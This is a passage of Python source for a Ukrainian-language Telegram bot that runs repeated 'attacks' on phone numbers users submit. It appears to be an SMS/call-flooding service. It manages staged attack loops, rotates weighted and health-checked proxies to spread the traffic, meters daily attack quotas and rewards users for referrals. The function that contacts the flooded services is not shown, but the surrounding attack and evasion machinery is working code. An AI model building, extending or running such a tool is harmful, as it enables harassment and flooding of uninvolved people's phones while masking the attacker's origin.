                # Виконуємо один етап атаки (прохід по всіх сервісах)
                # Передаємо лічильник та список проксі для продовження round-robin між етапами
                await ukr(number, chat_id, global_proxy_counter, global_shuffled_proxies)
                logging.info(f"[ATTACK] Етап {stage_num} завершено. Використано проксі до індексу {global_proxy_counter['value']}")
            except Exception as e:
                logging.error(f"Помилка в етапі атаки (продовжуємо): {e}")
            
            if not attack_flags.get(chat_id):
                logging.info(f"Атаку на номер {number} зупинено користувачем.")
                await update_status(f'🛑 Атака на номер <i>{number}</i> зупинена користувачем.')
                return
            
            # Пауза між етапами (якщо не останній етап і не вичерпано час)
            if stage_num < MAX_STAGES and (asyncio.get_event_loop().time() - start_time) < (timeout - 10):
                pause_time = random.randint(PAUSE_MIN, PAUSE_MAX)
                logging.info(f"[ATTACK] Пауза {pause_time} сек перед наступним етапом...")
                await update_status(f'🎯 Місія в процесі\n\n📱 Ціль: <i>{number}</i>\n\n⚡ Етап: {stage_num}/{MAX_STAGES}\n⏸ Пауза {pause_time} сек...')
                
                # Перевіряємо під час паузи чи не зупинили атаку
                elapsed = 0
                while elapsed < pause_time:
                    if not attack_flags.get(chat_id):
                        return
                    sleep_chunk = min(5, pause_time - elapsed)  # Перевіряємо кожні 5 сек
                    await asyncio.sleep(sleep_chunk)
                    elapsed += sleep_chunk
            
    except asyncio.CancelledError:
        await update_status(f'🛑 Атака на номер <i>{number}</i> зупинена.')
    except Exception as e:
        logging.error(f"Критична помилка при виконанні атаки: {e}")
        await update_status(f'❌ Помилка при виконанні атаки на номер <i>{number}</i>.')
    finally:
        attack_flags[chat_id] = False

    logging.info(f"Атака на номер {number} завершена")
    
    async with db_pool.acquire() as conn:
        user_data = await conn.fetchrow(
            'SELECT attacks_left, promo_attacks, referral_attacks FROM users WHERE user_id = $1',
            chat_id
        )
    attacks_left = user_data['attacks_left'] if user_data else 0
    promo_attacks = user_data['promo_attacks'] if user_data else 0
    referral_attacks = user_data['referral_attacks'] if user_data and 'referral_attacks' in user_data else 0
    total_attacks = attacks_left + promo_attacks + referral_attacks
    
    # Оновлюємо фінальний статус в існуючому повідомленні
    # Передаємо status_message_id через замикання
    inline_keyboard2 = types.InlineKeyboardMarkup()
    code_sub = types.InlineKeyboardButton(text='🎪 Канал', url='https://t.me/+tod0WSFEpEQ2ODcy')
    inline_keyboard2 = inline_keyboard2.add(code_sub)
    
    final_text = f"""👍 Атака на номер <i>{number}</i> завершена!

🔥 Сподобалась робота бота? 
Допоможи нам зростати — запроси друга!

💬 Якщо є питання або пропозиції, звертайся до @Nobysss

Приєднуйся до нашого ком'юніті 👇"""
    
    if status_message_id:
        try:
            await bot.edit_message_text(
                chat_id=chat_id,
                message_id=status_message_id,
                text=final_text,
                parse_mode="html",
                reply_markup=inline_keyboard2
            )
        except Exception:
            # Якщо не вдалося оновити, відправляємо нове повідомлення асинхронно
            asyncio.create_task(bot.send_message(
                chat_id=chat_id,
                text=final_text,
                parse_mode="html",
                reply_markup=inline_keyboard2
            ))
    else:
        asyncio.create_task(bot.send_message(
            chat_id=chat_id,
            text=final_text,
            parse_mode="html",
            reply_markup=inline_keyboard2
        ))

def parse_proxy_for_aiohttp(proxy_str: str):
    try:
        from urllib.parse import urlparse
        parsed = urlparse(proxy_str)
        if parsed.username and parsed.password:
            auth = BasicAuth(parsed.username, parsed.password)
            # rebuild without credentials
            host = f"{parsed.scheme}://{parsed.hostname}:{parsed.port}" if parsed.port else f"{parsed.scheme}://{parsed.hostname}"
            return host, auth
        return proxy_str, None
    except Exception:
        return proxy_str, None

def mask_proxy_for_log(proxy_str: str) -> str:
    try:
        from urllib.parse import urlparse
        parsed = urlparse(proxy_str)
        host = parsed.hostname or proxy_str
        port = f":{parsed.port}" if parsed.port else ""
        scheme = parsed.scheme + "://" if parsed.scheme else ""
        return f"{scheme}{host}{port}"
    except Exception:
        return proxy_str

def normalize_proxy_string(raw: str) -> str:
    # Convert multiple known forms to scheme://user:pass@host:port or scheme://host:port
    import re
    if '://' not in raw:
        parts = raw.split(':')
        if len(parts) == 4:
            host, port, user, pwd = parts
            return f"http://{user}:{pwd}@{host}:{port}"
        if len(parts) == 2:
            host, port = parts
            return f"http://{host}:{port}"
        return raw
    m = re.match(r'^(?P<sch>https?|socks5)://(?P<host>[^:/]+):(?P<port>\d+):(?P<user>[^:]+):(?P<pwd>.+)$', raw)
    if m:
        sch = m.group('sch')
        host = m.group('host')
        port = m.group('port')
        user = m.group('user')
        pwd = m.group('pwd')
        return f"{sch}://{user}:{pwd}@{host}:{port}"
    return raw

async def check_proxy(proxy_url: str, timeout_sec: int = 5) -> tuple:
    start = asyncio.get_event_loop().time()
    # Normalize on the fly for safety
    try:
        normalized = normalize_proxy_string(proxy_url)
    except Exception:
        normalized = proxy_url
    url, auth = parse_proxy_for_aiohttp(normalized)
    try:
        logging.debug(f"[PROXY] Checking {mask_proxy_for_log(normalized)} via {url}")
        # Використовуємо перевикористану сесію або створюємо нову для чекінгу
        session = await get_http_session()
        timeout = aiohttp.ClientTimeout(total=timeout_sec)
        async with session.get('https://api.ipify.org?format=json', proxy=url, proxy_auth=auth, timeout=timeout) as resp:
            ok = resp.status == 200
            latency = int((asyncio.get_event_loop().time() - start) * 1000)
            logging.debug(f"[PROXY] Result {mask_proxy_for_log(normalized)} => ok={ok}, latency={latency}ms, status={resp.status}")
            return ok, latency
    except Exception as e:
        latency = int((asyncio.get_event_loop().time() - start) * 1000)
        logging.debug(f"[PROXY] Error {mask_proxy_for_log(normalized)} => {e}, latency={latency}ms")
        return False, latency

async def ensure_recent_proxy_check(max_age_minutes: int = 10):
    # Normalize any legacy proxy formats before checking
    try:
        await normalize_existing_proxies()
    except Exception as e:
        logging.error(f"[PROXY] Normalize before check failed: {e}")
    async with db_pool.acquire() as conn:
        proxies = await conn.fetch('SELECT id, proxy_url, last_check, success_count, fail_count FROM proxies WHERE is_active = TRUE')
    now = datetime.now()
    needs_check = []
    for p in proxies:
        if not p['last_check'] or (now - p['last_check']).total_seconds() > max_age_minutes * 60:
            needs_check.append(p)
    if not needs_check:
        logging.info("[PROXY] No proxies need check (all fresh)")
        return
    # check in parallel
    logging.info(f"[PROXY] Checking {len(needs_check)} proxies (stale or never checked)")
    results = await asyncio.gather(*[check_proxy(p['proxy_url']) for p in needs_check], return_exceptions=True)
    async with db_pool.acquire() as conn:
        for p, res in zip(needs_check, results):
            if isinstance(res, Exception):
                ok, latency = False, 0
            else:
                ok, latency = res
            if ok:
                await conn.execute('UPDATE proxies SET last_check=$1, avg_latency_ms=$2, success_count=success_count+1 WHERE id=$3', datetime.now(), latency, p['id'])
                logging.debug(f"[PROXY] Updated (OK) {mask_proxy_for_log(p['proxy_url'])}: latency={latency}ms")
            else:
                await conn.execute('UPDATE proxies SET last_check=$1, avg_latency_ms=$2, fail_count=fail_count+1 WHERE id=$3', datetime.now(), latency, p['id'])
                logging.debug(f"[PROXY] Updated (FAIL) {mask_proxy_for_log(p['proxy_url'])}: latency={latency}ms")

async def get_available_proxies(min_success_rate: int = 50, use_cache: bool = True):
    """Отримує доступні проксі з weighted rotation та circuit breaker"""
    async with _proxy_cache_lock:
        cache_key = f"proxies_{min_success_rate}"
        if use_cache and cache_key in _proxy_cache:
            cached_data, cached_time = _proxy_cache[cache_key]
            if (datetime.now() - cached_time).total_seconds() < 30:  # Cache на 30 сек
                logging.debug(f"[PROXY] Using cached proxy list ({len(cached_data)} proxies)")
                return cached_data
    
    async with db_pool.acquire() as conn:
        rows = await conn.fetch('SELECT proxy_url, success_count, fail_count, avg_latency_ms FROM proxies WHERE is_active = TRUE AND last_check IS NOT NULL')
    
    available = []
    now = asyncio.get_event_loop().time()
    
    # Circuit breaker: пропускаємо проксі, які нещодавно провалилися багато разів
    CIRCUIT_BREAKER_THRESHOLD = 5  # Після 5 поспіль фейлів
    CIRCUIT_BREAKER_COOLDOWN = 300  # 5 хвилин
    
    for r in rows:
        total = r['success_count'] + r['fail_count']
        rate = (r['success_count'] * 100 // total) if total > 0 else 0
        
        # Circuit breaker check
        proxy_url = r['proxy_url']
        if proxy_url in _proxy_circuit_breaker:
            fail_count, last_fail = _proxy_circuit_breaker[proxy_url]
            if fail_count >= CIRCUIT_BREAKER_THRESHOLD:
                if now - last_fail < CIRCUIT_BREAKER_COOLDOWN:
                    logging.debug(f"[PROXY] {mask_proxy_for_log(proxy_url)} in circuit breaker (cooldown)")
                    continue
                else:
                    # Reset після cooldown
                    _proxy_circuit_breaker.pop(proxy_url, None)
        
        if rate >= min_success_rate:
            # Weighted selection: вища стабільність та нижча латентність = вища вага
            latency_penalty = max(1, r['avg_latency_ms'] // 100)  # 100ms = 1 penalty point
            weight = max(1, rate // latency_penalty)
            _proxy_weights[proxy_url] = weight
            available.append(proxy_url)
            logging.debug(f"[PROXY] {mask_proxy_for_log(proxy_url)}: weight={weight}, rate={rate}%, latency={r['avg_latency_ms']}ms")
        else:
            logging.debug(f"[PROXY] {mask_proxy_for_log(proxy_url)} filtered: rate={rate}% < {min_success_rate}%")
    
    # Cache результат
    async with _proxy_cache_lock:
        _proxy_cache[cache_key] = (available, datetime.now())
    
    logging.info(f"[PROXY] Available proxies (threshold {min_success_rate}%): {len(available)}/{len(rows)}")
    return available

def pick_weighted_proxy(proxies: list, index: int) -> tuple:
    """Weighted random selection проксі"""
    if not proxies:
        return None, None
    import random
    if len(proxies) == 1:
        selected = proxies[0]
    else:
        # Використовуємо ваги для selection
        weights = [_proxy_weights.get(p, 1) for p in proxies]
        selected = random.choices(proxies, weights=weights, k=1)[0]
    
    normalized = normalize_proxy_string(selected)
    url, auth = parse_proxy_for_aiohttp(normalized)
    logging.debug(f"[PROXY] Pick weighted proxy => {mask_proxy_for_log(normalized)}")
    return url, auth

async def load_proxies_from_file(file_path: str):
    try:
        with open(file_path, 'r', encoding='utf-8') as f:
            lines = [l.strip() for l in f.readlines()]
    except FileNotFoundError:
        logging.info(f"Proxy file '{file_path}' not found. Skipping load.")
        return
    if not lines:
        return
    # normalize and insert
    cleaned: list[str] = []
    for line in lines:
        if not line or line.startswith('#'):
            continue
        raw = line
        # Support formats:
        # - host:port
        # - host:port:user:pass
        # - scheme://user:pass@host:port
        # - scheme://host:port:user:pass (convert to scheme://user:pass@host:port)
        if '://' not in raw:
            parts = raw.split(':')
            if len(parts) == 4:
                host, port, user, pwd = parts
                url = f"http://{user}:{pwd}@{host}:{port}"
            elif len(parts) == 2:
                host, port = parts
                url = f"http://{host}:{port}"
            else:
                url = raw
                if not (url.startswith('http://') or url.startswith('https://') or url.startswith('socks5://')):
                    url = 'http://' + url
        else:
            # Has scheme; try to detect scheme://host:port:user:pass
            try:
                import re
                m = re.match(r'^(?P<sch>https?|socks5)://(?P<host>[^:/]+):(?P<port>\d+):(?P<user>[^:]+):(?P<pwd>.+)$', raw)
                if m:
                    sch = m.group('sch')
                    host = m.group('host')
                    port = m.group('port')
                    user = m.group('user')
                    pwd = m.group('pwd')
                    url = f"{sch}://{user}:{pwd}@{host}:{port}"
                else:
                    url = raw
            except Exception:
                url = raw
        cleaned.append(url)
    if not cleaned:
        return
    logging.info(f"[PROXY] Loaded {len(cleaned)} proxies from {file_path}")
    async with db_pool.acquire() as conn:
        for url in cleaned:
            try:
                await conn.execute('INSERT INTO proxies (proxy_url) VALUES ($1) ON CONFLICT (proxy_url) DO NOTHING', url)
                logging.info(f"[PROXY] Inserted {mask_proxy_for_log(url)}")
            except Exception as e:
                logging.error(f"Failed to insert proxy {url}: {e}")

async def load_proxies_from_possible_files():
    # Try common filenames in order
    for name in ["proxy", "proxy.txt", "proxies", "proxies.txt"]:
        try:
            await load_proxies_from_file(name)
        except Exception as e:
            logging.error(f"Failed to load from {name}: {e}")

async def normalize_existing_proxies():
    # Convert any scheme://host:port:user:pass rows to scheme://user:pass@host:port
    import re
    async with db_pool.acquire() as conn:
        rows = await conn.fetch('SELECT id, proxy_url FROM proxies')
    updates = []
    for r in rows:
        raw = r['proxy_url']
        m = re.match(r'^(?P<sch>https?|socks5)://(?P<host>[^:/]+):(?P<port>\d+):(?P<user>[^:]+):(?P<pwd>.+)$', raw)
        if m:
            sch = m.group('sch')
            host = m.group('host')
            port = m.group('port')
            user = m.group('user')
            pwd = m.group('pwd')
            new_url = f"{sch}://{user}:{pwd}@{host}:{port}"
            updates.append((new_url, r['id']))
    if updates:
        logging.debug(f"[PROXY] Normalizing {len(updates)} proxy URLs in DB")
        async with db_pool.acquire() as conn:
            for new_url, pid in updates:
                try:
                    await conn.execute('UPDATE proxies SET proxy_url=$1 WHERE id=$2', new_url, pid)
                except Exception as e:
                    # Тиха обробка дублікатів
                    if 'duplicate' in str(e).lower() or 'unique' in str(e).lower():
                        logging.debug(f"[PROXY] Duplicate proxy URL (skipping): {mask_proxy_for_log(new_url)}")
                    else:
                        logging.error(f"[PROXY] Error normalizing proxy {pid}: {e}")

@dp.message_handler(lambda message: message.text and not message.text.startswith('/start'), content_types=['text'])
@dp.throttled(anti_flood, rate=3)
async def handle_phone_number(message: Message):
    # Перевіряємо, що повідомлення з особистого чату
    if message.chat.type != 'private':
        return  # Ігноруємо повідомлення з груп
    
    # Ігноруємо текст кнопок
    button_texts = ['🆘 Допомога', '🎪 Запросити друга', '🎯 Почати атаку', '❓ Перевірити атаки']
    if message.text in button_texts or message.text.strip().startswith('/stats'):
        return
    
    user_id = message.from_user.id
    
    if not await user_exists(user_id):
        await message.answer("Для використання бота потрібно натиснути /start")
        return
    
    async with db_pool.acquire() as conn:
        result = await conn.fetchrow("SELECT block FROM users WHERE user_id = $1", user_id)
    
    if not result:
        await message.answer("Помилка: Не вдалося знайти користувача.")
        return

    if result['block'] == 1:
        await message.answer("Вас заблоковано і ви не можете користуватися ботом.")
        return

    number = message.text.strip()
    chat_id = message.chat.id
    
    number = re.sub(r'\D', '', number)
    if number.startswith('0'):
        number = '380' + number[1:]

    if len(number) == 12 and number.startswith('380'):
        async with db_pool.acquire() as conn:
            is_blacklisted = await conn.fetchval("SELECT 1 FROM blacklist WHERE phone_number = $1", number)
        if is_blacklisted:
            await message.answer(f"Номер <i>{number}</i> захищений від атаки.", parse_mode="html")
            return

        # Перевірка лімітів: 30 атак/день + промо/реферальні
        can_attack, attacks_left, promo_attacks, referral_attacks = await check_attack_limits(user_id)
        if not can_attack:
            await message.answer("❌ Капітане, на сьогодні ліміт атак вичерпано🙁. Чекаємо на вас завтра або ви можете скористуватись промокодом чи рефералом.")
            return
        # Резервуємо атаку: списуємо з пріоритетом промо -> реферальні -> звичайні
        async with db_pool.acquire() as conn:
            if promo_attacks > 0:
                await conn.execute('UPDATE users SET promo_attacks = promo_attacks - 1, last_attack_date = $1 WHERE user_id = $2', datetime.now(), user_id)
                logging.info(f"[ATTACKS] User {user_id}: Spent 1 promo attack (was {promo_attacks}, now {promo_attacks - 1})")
            elif referral_attacks > 0:
                await conn.execute('UPDATE users SET referral_attacks = referral_attacks - 1, last_attack_date = $1 WHERE user_id = $2', datetime.now(), user_id)
                logging.info(f"[ATTACKS] User {user_id}: Spent 1 referral attack (was {referral_attacks}, now {referral_attacks - 1})")
            else:
                await conn.execute('UPDATE users SET attacks_left = attacks_left - 1, last_attack_date = $1 WHERE user_id = $2', datetime.now(), user_id)
                logging.info(f"[ATTACKS] User {user_id}: Spent 1 regular attack (was {attacks_left}, now {attacks_left - 1})")
        cancel_keyboard = get_cancel_keyboard()
        attack_flags[chat_id] = True 
        status_msg = await message.answer(f'🎯 Місія розпочата!\n\n📱 Ціль: <i>{number}</i>\n\n⚡ Статус: В процесі...', parse_mode="html", reply_markup=get_cancel_keyboard())

        asyncio.create_task(start_attack(number, chat_id, status_msg.message_id))
    else:
        await message.answer("⚠️ Ви некоректно ввели номер телефону!\nБудь ласка, перевірте формат і спробуйте ще раз</i>", parse_mode="html")

@dp.callback_query_handler(lambda c: c.data == "cancel_attack")
async def cancel_attack(callback_query: types.CallbackQuery):
    chat_id = callback_query.message.chat.id
    attack_flags[chat_id] = False
    await callback_query.answer("Зупиняємо...")

async def check_attack_limits(user_id: int):
    today = datetime.now().date()
    
    async with db_pool.acquire() as conn:
        result = await conn.fetchrow(
            "SELECT attacks_left, promo_attacks, referral_attacks, unused_referral_attacks, last_attack_date FROM users WHERE user_id = $1",
            user_id
        )
        
        if not result:
            return False, 0, 0, 0
        
        attacks_left = result['attacks_left']
        promo_attacks = result['promo_attacks']
        referral_attacks = result['referral_attacks']
        unused_referral_attacks = result['unused_referral_attacks']
        last_attack_date = result['last_attack_date']
        
        # Приводим last_attack_date к дате для корректного сравнения
        if last_attack_date:
            last_attack_date_only = last_attack_date.date()
        else:
            last_attack_date_only = today
        
        # Перевіряємо, чи потрібно скинути атаки на новий день
        if last_attack_date_only != today:
            # Зберігаємо невикористані реферальні атаки
            if referral_attacks > 0:
                unused_referral_attacks += referral_attacks
            # Скидаємо звичайні атаки на 30, додаємо накопичені реферальні
            new_attacks = 30 + unused_referral_attacks
            await conn.execute(
                "UPDATE users SET attacks_left = $1, referral_attacks = 0, unused_referral_attacks = 0, last_attack_date = $2 WHERE user_id = $3",
                new_attacks, today, user_id
            )
            # Оновлюємо локальні змінні після оновлення БД
            attacks_left = new_attacks
            referral_attacks = 0
            unused_referral_attacks = 0
            # Перечитую з БД для гарантії актуальності
            result = await conn.fetchrow(
                "SELECT attacks_left, promo_attacks, referral_attacks, unused_referral_attacks FROM users WHERE user_id = $1",
                user_id
            )
            if result:
                attacks_left = result['attacks_left']
                promo_attacks = result['promo_attacks']
                referral_attacks = result['referral_attacks']
        
        total_attacks = attacks_left + promo_attacks + referral_attacks
        can_attack = total_attacks > 0
        
        logging.info(f"[ATTACKS] User {user_id}: total={total_attacks}, left={attacks_left}, promo={promo_attacks}, ref={referral_attacks}, can_attack={can_attack}")
        
        return can_attack, attacks_left, promo_attacks, referral_attacks

async def user_exists(user_id: int) -> bool:
    """
    Проверяет, существует ли пользователь в базе данных
    """
    async with db_pool.acquire() as conn:
        result = await conn.fetchrow('SELECT 1 FROM users WHERE user_id = $1', user_id)
    return result is not None

# РОЗЫГРЫШ VIP-СТАТУСА

# Удалить этот обработчик:
# @dp.message_handler(lambda message: message.chat.type in ['group', 'supergroup'] and message.text and f'@{bot._me.username}' in message.text if hasattr(bot, '_me') else False)

# Добавить вместо него inline-обработчики:

@dp.inline_handler()
async def inline_giveaway(inline_query: types.InlineQuery):
    """Обработчик inline-запросов для розыгрыша"""
    user_id = inline_query.from_user.id
    
    # Перевіряємо, що inline-запит йде з групового чату
    # Якщо inline використовується в особистому чаті - не показуємо розіграш
    if inline_query.chat_type not in ['group', 'supergroup']:
        results = [
            types.InlineQueryResultArticle(
                id='group_only',
                title='🎪 Тільки для груп',
                description='Розіграш доступний тільки в групових чатах',
                input_message_content=types.InputTextMessageContent(
                    message_text='🎪 Розіграш VIP-статусу доступний лише в групових чатах!'
                )
            )
        ]
        await bot.answer_inline_query(inline_query.id, results, cache_time=1)
        return
    
    # Перевіряємо права користувача
    if user_id not in ADMIN:
        # Для обычных пользователей показываем "отказ"
        results = [
            types.InlineQueryResultArticle(
                id='no_access',
                title='🎪 Немає доступу',
                description='Тільки адміністратори можуть проводити розіграші',
                input_message_content=types.InputTextMessageContent(
                    message_text='🎪 Тільки адміністратори можуть проводити розіграші!'
                )
            )
        ]
    else:
        # Для админов показываем кнопку розыгрыша
        results = [
            types.InlineQueryResultArticle(
                id='start_giveaway',
                title='🎪 Розіграш VIP-статусу',
                description='Визначити випадкового переможця серед активних користувачів',
                input_message_content=types.InputTextMessageContent(
                    message_text='🎉 <b>Розіграш VIP-статусу</b>\n\nГотовий обрати випадкового переможця серед усіх активних користувачів бота!\nНатисніть кнопку нижче, щоб запустити розіграш 🎲',
                    parse_mode='HTML'
                ),
                reply_markup=types.InlineKeyboardMarkup().add(
                    types.InlineKeyboardButton("🎪 Визначити переможця", callback_data="start_giveaway")
                )
            )
        ]
    
    await bot.answer_inline_query(inline_query.id, results, cache_time=1)

@dp.callback_query_handler(lambda c: c.data == "start_giveaway")
async def start_giveaway(callback_query: types.CallbackQuery):
    """Запуск розыгрыша VIP-статуса"""
    user_id = callback_query.from_user.id
    
    # Перевіряємо права
    if user_id not in ADMIN:
        await callback_query.answer("🚫 Недостатньо прав!", show_alert=True)
        return
    
    # Отримуємо інформацію про чат з inline_message_id або message
    chat_id = None
    message_id = None
    
    if callback_query.message:
        chat_id = callback_query.message.chat.id
        message_id = callback_query.message.message_id
        chat_type = callback_query.message.chat.type
    elif callback_query.inline_message_id:
        # Для inline-повідомлень запускаємо повну анімацію
        await callback_query.answer("🎰 Запускаю розыгрыш...")
        
        # Отримуємо список активних користувачів
        async with db_pool.acquire() as conn:
            users = await conn.fetch('SELECT user_id, name, username FROM users WHERE block = 0')
        
        if not users:
            await bot.edit_message_text(
                "❌ Нет активных пользователей для розыгрыша!",
                inline_message_id=callback_query.inline_message_id
            )
            return
        
        # Фільтруємо активних користувачів
        active_users = []
        for user in users:
            try:
                await bot.send_chat_action(user['user_id'], 'typing')
                active_users.append(user)
            except (BotBlocked, UserDeactivated, ChatNotFound):
                continue
            except Exception:
                continue
        
        if not active_users:
            await bot.edit_message_text(
                "❌ Нет активных пользователей для розыгрыша!",
                inline_message_id=callback_query.inline_message_id
            )
            return
        
        # Запускаємо анімацію для inline-повідомлення
        await run_inline_giveaway_animation(callback_query.inline_message_id, active_users)
        return
    else:
        await callback_query.answer("❌ Помилка: не вдалося визначити чат!", show_alert=True)
        return
    
    # Перевіряємо, що це груповий чат
    if chat_type not in ['group', 'supergroup']:
        await callback_query.answer("🚫 Розыгрыш доступен только в групповых чатах!", show_alert=True)
        return
    
    # Перевіряємо, чи не йде вже розіграш
    if giveaway_flags.get(chat_id):
        await callback_query.answer("⏳ Розыгрыш уже идет!", show_alert=True)
        return
    
    await callback_query.answer("🎰 Запускаю розыгрыш...")
    giveaway_flags[chat_id] = True
    
    try:
        # Отримуємо список активних користувачів
        async with db_pool.acquire() as conn:
            users = await conn.fetch('SELECT user_id, name, username FROM users WHERE block = 0')
        
        if not users:
            await bot.edit_message_text(
                "❌ Нет активных пользователей для розыгрыша!",
                chat_id=chat_id,
                message_id=message_id
            )
            return
        
        # Фільтруємо активних користувачів (тех, кто не заблокировал бота)
        active_users = []
        for user in users:
            try:
                await bot.send_chat_action(user['user_id'], 'typing')
                active_users.append(user)
            except (BotBlocked, UserDeactivated, ChatNotFound):
                continue
            except Exception:
                continue
        
        if not active_users:
            await bot.edit_message_text(
                "❌ Нет активных пользователей для розыгрыша!",
                chat_id=chat_id,
                message_id=message_id
            )
            return
        
        # Запускаем анимацию поиска
        await run_giveaway_animation(chat_id, message_id, active_users)
        
    except Exception as e:
        logging.error(f"Помилка в розіграші: {e}")
        try:
            await bot.edit_message_text(
                "❌ Сталася помилка при проведенні розіграшу!",
                chat_id=chat_id,
                message_id=message_id
            )
        except Exception as edit_error:
            logging.error(f"Помилка при редагуванні повідомлення: {edit_error}")
            try:
                await bot.send_message(chat_id, "❌ Сталася помилка при проведенні розіграшу!")
            except Exception as send_error:
                logging.error(f"Помилка при відправленні повідомлення: {send_error}")
    finally:
        giveaway_flags[chat_id] = False

async def run_giveaway_animation(chat_id: int, message_id: int, active_users: list):
    """Анимация розыгрыша с прогресс-баром"""
    import random
    
    # Повідомлення для анімації
    search_messages = [
        "🎪 Перемешиваю участников...",
        "⚡ Запускаю генератор случайных чисел...",
        "🎲 Крутится колесо фортуны...",
        "🎯 Почти готово...",
    ]
    
    total_steps = 4
    step_duration = 3.0  # секунда на шаг
    
    for step in range(total_steps):
        if not giveaway_flags.get(chat_id):
            return
        
        # Створюємо прогрес-бар
        filled = (step + 1) * 2
        empty = 8 - filled
        progress_bar = "▓" * filled + "░" * empty
        percentage = (step + 1) * 25     
        # Вибираємо повідомлення
        if step < len(search_messages):
            message = search_messages[step]
        else:
            message = random.choice(search_messages)
        
        # Оновлюємо повідомлення
        text = f"🎉 <b>Розіграш VIP-статусу</b>\n\n{message}\n\n[{progress_bar}] {percentage}%\n\n👥 Учасників: {len(active_users)}"
        
        try:
            await bot.edit_message_text(
                text,
                chat_id=chat_id,
                message_id=message_id,
                parse_mode='HTML'
            )
        except Exception as e:
            logging.error(f"Помилка оновлення повідомлення на кроці {step}: {e}")
            # Якщо не можемо редагувати, пропускаємо цей крок
            pass
        
        if step < total_steps:
            await asyncio.sleep(step_duration)
    
    # Вибираємо переможця
    winner = random.choice(active_users)
    winner_name = winner['name'] or "Без имени"
    winner_username = winner['username']
    winner_id = winner['user_id']
    
    # Формуємо посилання на профіль
    if winner_username:
        profile_link = f"<a href='https://t.me/{winner_username}'>@{winner_username}</a>"
        display_name = f"{winner_name} (@{winner_username})"
    else:
        profile_link = f"<a href='tg://user?id={winner_id}'>{winner_name}</a>"
        display_name = winner_name
    
    # Фінальне повідомлення
    final_text = (
        f"🎉 <b>Вітаємо переможця!</b>\n\n"
        f"🏆 Переможець розіграшу VIP-статусу:\n"
        f"👤 {profile_link}\n"
        f"🆔 ID: <code>{winner_id}</code>\n\n"
        f"🎊 Вітаємо з перемогою!"
    )
    
    try:
        await bot.edit_message_text(
            final_text,
            chat_id=chat_id,
            message_id=message_id,
            parse_mode='HTML'
        )
    except Exception as e:
        logging.error(f"Помилка фінального повідомлення: {e}")
        # Якщо не можемо відредагувати, надсилаємо нове повідомлення
        try:
            await bot.send_message(chat_id, final_text, parse_mode='HTML')
        except Exception as send_error:
            logging.error(f"Помилка при відправленні фінального повідомлення: {send_error}")

async def run_inline_giveaway_animation(inline_message_id: str, active_users: list):
    """Анимация розыгрыша для inline-сообщений"""
    import random
    
    # Повідомлення для анімації
    search_messages = [
        "🎪 Перемешиваю участников...",
        "⚡ Запускаю генератор случайных чисел...",
        "✨ Определяю победителя...",
        "🎯 Почти готово...",
    ]
    
    total_steps = 4
    step_duration = 3.0  # секунда на шаг
    
    for step in range(total_steps):
        # Створюємо прогрес-бар
        filled = (step + 1) * 2
        empty = 8 - filled
        progress_bar = "▓" * filled + "░" * empty
        percentage = (step + 1) * 25
        
        # Вибираємо повідомлення
        if step < len(search_messages):
            message = search_messages[step]
        else:
            message = random.choice(search_messages)
        
        # Оновлюємо повідомлення
        text = f"🎉 <b>Розіграш VIP-статусу</b>\n\n{message}\n\n[{progress_bar}] {percentage}%\n\n👥 Учасників: {len(active_users)}"
        
        try:
            await bot.edit_message_text(
                text,
                inline_message_id=inline_message_id,
                parse_mode='HTML'
            )
        except Exception as e:
            logging.error(f"Ошибка обновления inline-сообщения на шаге {step}: {e}")
            pass
        
        if step < total_steps:
            await asyncio.sleep(step_duration)
    
    # Вибираємо переможця
    winner = random.choice(active_users)
    winner_name = winner['name'] or "Без имени"
    winner_username = winner['username']
    winner_id = winner['user_id']
    
    # Формуємо посилання на профіль
    if winner_username:
        profile_link = f"<a href='https://t.me/{winner_username}'>@{winner_username}</a>"
    else:
        profile_link = f"<a href='tg://user?id={winner_id}'>{winner_name}</a>"
    
    # Фінальне повідомлення
    final_text = (
        f"🎉 <b>Вітаємо переможця!</b>\n\n"
        f"🏆 Переможець розіграшу VIP-статусу:\n"
        f"👤 {profile_link}\n"
        f"🆔 ID: <code>{winner_id}</code>\n\n"
        f"🎊 Вітаємо з перемогою!"
    )
    
    try:
        await bot.edit_message_text(
            final_text,
            inline_message_id=inline_message_id,
            parse_mode='HTML'
        )
    except Exception as e:
        logging.error(f"Помилка фінального inline-повідомлення: {e}")

# Додаю функцію для нарахування реферальних атак
async def process_referral(referrer_id, user_id, username, name):
    if not referrer_id:
        return
    async with db_pool.acquire() as conn:
        await conn.execute(
            'INSERT INTO referrals (referrer_id, referred_id) VALUES ($1, $2) ON CONFLICT (referred_id) DO NOTHING',
            referrer_id, user_id
        )
        await conn.execute(
            'UPDATE users SET referral_attacks = referral_attacks + 10, referral_count = referral_count + 1 WHERE user_id = $1',
            referrer_id
        )
        # +10 атаки запрошеному користувачу на один день
        await conn.execute(
            'UPDATE users SET referral_attacks = referral_attacks + 10 WHERE user_id = $1',
            user_id
        )
        try:
            ref_name = username or name or f"User{user_id}"
            await bot.send_message(
                referrer_id,
                f"🎉 За вашою реферальною силкою приєднався новий користувач: <a href='tg://user?id={user_id}'>{ref_name}</a>\n🚀 Ви отримали +10 додаткових атак на один день!",
                parse_mode='HTML'
            )
        except Exception as e:
            logging.error(f"Error notifying referrer {referrer_id}: {e}")

USER_STATS_ALLOWED = [810944378]

if __name__ == '__main__':
    logging.info("Запуск бота...")
    loop = asyncio.get_event_loop()
    loop.run_until_complete(init_db())
    executor.start_polling(dp, skip_updates=True)
